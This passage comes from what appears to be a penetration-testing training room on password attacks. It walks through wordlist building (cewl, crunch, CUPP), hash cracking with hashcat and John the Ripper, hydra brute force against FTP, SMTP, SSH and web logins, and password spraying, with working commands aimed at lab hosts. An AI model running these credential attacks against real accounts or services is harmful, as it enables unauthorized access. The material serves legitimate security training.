password in order to gain unauthorized access to the machine.

### Password Cracking vs. Password Guessing

This
 section discusses password cracking terminology from a cybersecurity 
perspective. Also, we will discuss significant differences between 
password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including **Hashcat** and **John the Ripper**.

Password
 cracking is a technique used for discovering passwords from encrypted 
or hashed data to plaintext data. Attackers may obtain the encrypted or 
hashed passwords from a compromised computer or capture them from 
transmitting data over the network. Once passwords are obtained, the 
attacker can utilize password attacking techniques to crack these hashed
 passwords using various tools.

Password cracking is 
considered one of the traditional techniques in pen-testing. The primary
 goal is to let the attacker escalate to higher privileges and access to
 a computer system or network. Password 
guessing and password cracking are often commonly used by information 
security professionals. Both have different meanings and implications. 
Password guessing is a method of guessing passwords for online protocols
 and services based on dictionaries. The following are major differences
 between password cracking and password guessing:

- Password guessing is a technique used to target online protocols and services.
Therefore, it's considered time-consuming and opens up the opportunity
to generate logs for the failed login attempts. A password guessing
attack conducted on a web-based system often requires a new request to
be sent for each attempt, which can be easily detected. It may cause an
account to be locked out if the system is designed and configured
securely.
- Password cracking is a technique performed locally or on systems controlled by the attacker.

**Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists**

Having
 a good wordlist is critical to carrying out a successful password 
attack. It is important to know how you can generate username lists and 
password lists. In this section, we will discuss creating targeted 
username and password lists. We will also cover various topics, 
including default, weak, leaked passwords, and creating targeted 
wordlists.

# Default Passwords

Before
 performing password attacks, it is worth trying a couple of default 
passwords against the targeted service. Manufacturers set default 
passwords with products and equipment such as switches, firewalls, 
routers. There are scenarios where customers don't change the default 
password, which makes the system vulnerable. Thus, it is a good practice
 to try out admin:admin, admin:123456, etc. If we know the target device, we can look up the default passwords and try them out. For
 example, suppose the target server is a Tomcat, a lightweight, 
open-source Java application server. In that case, there are a couple of
 possible default passwords we can try: admin:admin or tomcat:admin.

Here are some website lists that provide default passwords for various products.

- [https://cirt.net/passwords](https://cirt.net/passwords)
- [https://default-password.info/](https://default-password.info/)
- [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

# Weak Passwords

Professionals
 collect and generate weak password lists over time and often combine 
them into one large wordlist. Lists are generated based on their 
experience and what they see in pentesting engagements. These
 lists may also contain leaked passwords that have been published 
publically. Here are some of the common weak passwords lists :

- [https://wiki.skullsecurity.org/index.php?title=Passwords](https://wiki.skullsecurity.org/index.php?title=Passwords) - This includes the most well-known collections of passwords.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

# Leaked Passwords

Sensitive
 data such as passwords or hashes may be publicly disclosed or sold as a
 result of a breach. These public or privately available leaks are often
 referred to as 'dumps'. Depending on the contents of the dump, an 
attacker may need to extract the passwords out of the data. In some 
cases, the dump may only contain hashes of the passwords and require 
cracking in order to gain the plain-text passwords. The following are 
some of the common password lists that have weak and leaked passwords, 
including webhost, elitehacker,hak5, Hotmail, PhpBB companies' leaks:

- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

### Combined wordlists

Let's
 say that we have more than one wordlist. Then, we can combine these 
wordlists into one large file. This can be done as follows using cat:

cewl

```
cat file1.txt file2.txt file3.txt > combined_list.txt
```

To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:

cewl

```
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized Wordlists

Customizing
 password lists is one of the best ways to increase the chances of 
finding valid credentials. We can create custom password lists from the 
target website. Often, a company's website contains valuable information
 about the company and its employees, including emails and employee 
names. In addition, the website may contain keywords specific to what 
the company offers, including product and service names, which may be 
used in an employee's password!

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:

cewl

```
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```

- w will write the contents to a file. In this case, list.txt.
- m 5 gathers strings (words) that are 5 characters or more
- d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

As
 a result, we should now have a decently sized wordlist based on 
relevant words for the specific enterprise, like names, locations, and a
 lot of their business lingo. Similarly, the wordlist that was created 
could be used to fuzz for usernames.

Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!

# Username Wordlists

Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a **{first name}** **{last name} (ex: John Smith)** and a method of generating usernames.

- **{first name}:** john
- **{last name}:** smith
- **{first name}{last name}: johnsmith**
- **{last name}{first name}: smithjohn**
- first letter of the **{first name}{last name}: jsmith**
- first letter of the **{last name}{first name}: sjohn**
- first letter of the **{first name}.{last name}: j.smith**
- first letter of the **{first name}-{last name}: j-smith**
- and so on

Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name.

Usernames

```
user@thm$ git clone https://github.com/therodri2/username_generator.gitCloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.

user@thm$ cd username_generator
```

Using python3 username_generator.py -h shows the tool's help message and optional arguments.

Usernames

```
user@thm$ python3 username_generator.py -husage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default
```

Now let's create a wordlist that contains the full name John Smith to
 a text file. Then, we'll run the tool to generate the possible 
combinations of the given full name.

Usernames

```
user@thm$ echo "John Smith" > users.lstuser@thm$ python3 username_generator.py -w users.lstusage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn
```

This is just one example of a custom username generator. Please feel 
free to explore more options or even create your own in the programming 
language of your choice!

**Password Profiling #2 - Keyspace Technique and CUPP**

# Keyspace Technique

Another
 way of preparing a wordlist is by using the key-space technique. In 
this technique, we specify a range of characters, numbers, and symbols 
in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch, we can specify numerous options, including min, max, and options as follows:

crunch

```
user@thm$ crunch -hcrunch version 3.6

Crunch can create a wordlist based on the criteria you specify.
The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch   [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.
```

The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to.

crunch

```
user@thm$ crunch 2 2 01234abcd -o crunch.txtCrunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: xx
crunch: 100% completed generating output
```

Here is a snippet of the output:

crunch

```
user@thm$ cat crunch.txt00
01
02
03
04
0a
0b
0c
0d
10
.
.
.
cb
cc
cd
d0
d1
d2
d3
d4
da
db
dc
dd

```

It's worth noting that crunch can 
generate a very large text file depending on the word length and 
combination options you specify. The following command creates a list 
with an 8 character minimum and maximum length containing numbers 0-9, 
a-f lowercase letters, and A-F uppercase letters:

crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words.

crunch also
 lets us specify a character set using the -t option to combine words of
 our choice. Here are some of the other options that could be used to 
help create different combinations of your choice:

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers:

crunch

```
user@thm$  crunch 6 6 -t pass%%Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03
```

# CUPP - Common User Passwords Profiler

CUPP
 is an automatic and interactive tool written in Python for creating 
custom wordlists. For instance, if you know some details about a 
specific target, such as their birthdate, pet name, company name, etc., 
this could be a helpful tool to generate passwords based on this known 
information. CUPP will take the information supplied and generate a 
custom wordlist based on what's provided. There's also support for a 1337/leet mode, which substitutes the letters a, i,e, t, o, s, g, z  with numbers. For example, replace a  with 4  or i with 1. For more information about the tool, please visit the GitHub repo [here](https://github.com/Mebus/cupp).

To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows:

CUPP

```
user@thm$  git clone https://github.com/Mebus/cupp.gitCloning into 'cupp'...
remote: Enumerating objects: 237, done.
remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.
Resolving deltas: 100% (125/125), done.

```

Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options.

CUPP

```
user@thm$  python3 cupp.py ___________
   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified
                     databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)
```

CUPP supports an interactive mode where it asks questions about the 
target and based on the provided answers, it creates a custom wordlist. 
If you don't have an answer for the given field, then skip it by 
pressing the Enter key.

CUPP

```
user@thm$  python3 cupp.py -i ___________
   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name:
> Surname:
> Nickname:
> Birthdate (DDMMYYYY):

> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):

> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):

> Pet's name:
> Company name:

> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
> Hyperspeed Print? (Y/n)

```

ِAs a result, a custom wordlist that contains various numbers of 
words based on your entries is generated. Pre-created wordlists can be 
downloaded to your machine as follows:

CUPP

```
user@thm$  python3 cupp.py -l ___________
   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian

        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number:
```

Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!

Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option.

CUPP

```
user@thm$  python3 cupp.py -a ___________
   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.
```

**Offline Attacks - Dictionary and Brute-Force**

This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.

# Dictionary attack

A
 dictionary attack is a technique used to guess passwords by using 
well-known words or phrases. The dictionary attack relies entirely on 
pre-gathered wordlists that were previously generated or found. It is 
important to choose or create the best candidate wordlist for your 
target in order to succeed in this attack. Let's
 explore performing a dictionary attack using what you've learned in the
 previous tasks about generating wordlists. We will showcase an offline 
dictionary attack using hashcat, which is a popular tool to crack hashes.

Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c, and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum:

1- What type of hash is this?

2- What wordlist will we be using? Or what type of attack mode could we use?

To identify the type of hash, we could a tool such as hashid or hash-identifier. For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).

Dictionary attack

```
user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: 123456 -> 123123Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021
```

- a 0 sets the attack mode to a dictionary attack
- m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack

We run hashcat with --show option to show the cracked value if the hash has been cracked:

Dictionary attack

```
user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --showf806fc5a2a0d5ba2471600758452799c:rockyou
```

As a result, the cracked value is rockyou.

# Brute-Force attack

Brute-forcing is a common attack used by the attacker to gain 
unauthorized access to a personal account. This method is used to guess 
the victim's password by sending standard password combinations. The 
main difference between a dictionary and a brute-force attack is that a 
dictionary attack uses a wordlist that contains all possible passwords.

In contrast, a brute-force attack aims to try all combinations of
 a character or characters. For example, let's assume that we have a 
bank account to which we need unauthorized access. We know that the PIN 
contains 4 digits as a password. We can perform a brute-force attack 
that starts from 0000 to 9999 to
 guess the valid PIN based on this knowledge. In other cases, a sequence
 of numbers or letters can be added to existing words in a list, such 
as admin0, admin1, .. admin9999.

For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options.

Brute-Force attack

```
user@machine$ hashcat --help ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff
```

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice.

Brute-Force attack

```
user@machine$ hashcat -a 3 ?d?d?d?d --stdout1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..
```

- a 3 sets the attacking mode as a brute-force attack

?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

- -stdout print the result to the terminal

Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.

Brute-Force attack

```
user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10Candidates.#1....: 1234 -> 6764Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021
```

**Offline Attacks - Rule-Based**

# Rule-Based attacks

Rule-Based attacks are also known as hybrid attacks. Rule-Based
 attacks assume the attacker knows something about the password policy. 
Rules are applied to create passwords within the guidelines of the given
 password policy and should, in theory, only generate valid passwords. 
Using pre-existing wordlists may be useful when generating passwords 
that fit a policy — for example, manipulating or 'mangling' a password 
such as 'password': p@ssword, Pa$$word, Passw0rd, and so on.

For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper  has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:

Rule-based attack

```
user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NFJumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9
```

We can see that we have many rules that are available for us to use. 
We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!

Rule-based attack

```
user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -lUsing default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
76
```

- -wordlist= to specify the wordlist or dictionary file.
- -rules to specify which rule or rules to use.
- -stdout to print the output to the terminal.

|wc -l  to count how many lines John produced.

By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic. KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website [here](https://contest-2010.korelogic.com/rules.html). Now let's use this rule and check whether the Tryh@ckm3 is available in our list!

Rule-based attack

```
user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999
```

The output from the previous command shows that our list has the complex version of tryhackme, which is Tryh@ckm3. Finally,
 we recommend checking out all the rules and finding one that works the 
best for you. Many rules apply combinations to an existing wordlist and 
expand the wordlist to increase the chance of finding a valid password!

# Custom Rules

John the ripper has
 a lot to offer. For instance, we can build our own rule(s) and use it 
at run time while john is cracking the hash or use the rule to build a 
custom wordlist!

Let's say we wanted to create a custom wordlist 
from a pre-existing dictionary with custom modification to the original 
dictionary. The goal is to add special characters (ex: !@#$*&) to 
the beginning of each word and add numbers 0-9 at the end. The format 
will be as follows:

[symbols]word[0-9]

We can add our rule to the end of john.conf:

John Rules

```
user@machine$ sudo vi /etc/john/john.conf [List.Rules:THM-Password-Attacks]
Az"[0-9]" ^[!@#$]
```

[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

Now let's create a file containing a single word password to see how we can expand our wordlist using this rule.

John Rules

```
user@machine$ echo "password" > /tmp/single.lst
```

We include the name of the rule we created in the John command using the --rules option. We also need to show the result in the terminal. We can do this by using --stdout as follows:

John Rules

```
user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout Using default input encoding: UTF-8
!password0
@password0
#password0 $password0
```

Now it's practice time to create your own rule.

**Online password attacks**

Online 
password attacks involve guessing passwords for networked services that 
use a username and password authentication scheme, including services 
such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases 
using hydra which is a common tool used in attacking logins for various network services.

# Hydra

Hydra supports an extensive list of network services to attack. Using
 hydra, we'll brute-force network services such as web login pages, FTP,
 SMTP, and SSH in this section. Often, within hydra, each service has 
its own options and the syntax hydra expects takes getting used to. It's
 important to check the help options for more information and features.

# FTP

In
 the following scenario, we will perform a brute-force attack against 
an FTP server. By checking the hydra help options, we know the syntax of
 attacking the FTP server is as follows:

FTP

```
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

- l ftp we are specifying a single username, use-L for a username wordlist
- P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.

# SMTP

Similar
 to FTP servers, we can also brute-force SMTP servers using hydra. The 
syntax is similar to the previous example. The only difference is the 
targeted protocol. Keep in mind, if you want to try other online 
password attack tools, you may need to specify the port number, which is
 25. Make sure to read the help options of the tool.

SMTP

```
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

# SSH

SSH 
brute-forcing can be common if your server is accessible to the 
Internet. Hydra supports many protocols, including SSH. We can use the 
previous syntax to perform our attack! It's important to notice that 
password attacks rely on having an excellent wordlist to increase your 
chances of finding a valid username and password.

SSH

```
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

# HTTP login pages

In this scenario, we will brute-force HTTP login pages.
 To do that, first, you need to understand what you are brute-forcing. 
Using hydra, it is important to specify the type of HTTP request, 
whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:

<url>:<form parameters>:<condition string>[:<optional>[:<optional>]

As
 we mentioned earlier, we need to analyze the HTTP request that we need 
to send, and that could be done either by using your browser dev tools 
or using a web proxy such as Burp Suite.

hydra

```
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra)
finished at 2021-10-13 08:06:45
```

- l admin we are specifying a single username, use-L for a username wordlist
- P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

The following section is important to eliminate false positives by specifying the 'failed' condition with F=.

And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What
 you set for these values depends on the response you receive back from 
the server for a failed login attempt and a successful login attempt. 
For example, if you receive a message on the webpage 'Invalid password' 
after a failed login, set F=Invalid Password.

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.

S=logout.php the success condition to identify the valid credentials

- f to stop the brute-forcing attacks after finding a valid username and password

You can try it out on the attached VM by visiting http://MACHINE_IP/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.

Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:

- Medusa
- Ncrack
- others!

**Password spray attack**

This task will teach 
the fundamentals of a password spraying attack and the tools needed to 
perform various attack scenarios against common online services.

Password Spraying is an effective technique used to identify valid 
credentials. Nowadays, password spraying is considered one of the common
 password attacks for discovering weak passwords. This technique can be 
used against various online services and authentication systems, such as
 SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack
 targets a specific username to try many weak and predictable passwords.
 While a password spraying attack targets many usernames using one 
common weak password, which could help avoid an account lockout policy. 
The following figure explains the concept of password spraying attacks 
where the attacker utilizes one common password against multiple users.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png)

Common
 and weak passwords often follow a pattern and format. Some commonly 
used passwords and their overall format can be found below.

- The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
- The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
- Using the company name along with random numbers (CompanyNameNumbers). For example, **TryHackMe01**, **TryHackMe02**.

If a password complexity policy is enforced within the 
organization, we may need to create a password that includes symbols to 
fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. **To
 be successful in the password spraying attack, we need to enumerate the
 target and create a list of valid usernames (or email addresses list)**.

Next, we will apply the password spraying technique using different scenarios against various services, including:

- SSH
- RDP
- Outlook web access (OWA) portal
- SMB

# SSH

Assume that we have already enumerated the system and created a valid username list.

Hashcat

```
user@THM:~# cat usernames-list.txtadmin
victim
dummy
adm
sammy

```

Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.

Hashcat

```
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found

```

Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.

# RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to
 password spray against RDP. First, install the tool on your attacking 
machine by following the installation instructions in the tool’s GitHub 
repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:

Hashcat

```
user@THM:~# python3 RDPassSpray.py -husage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
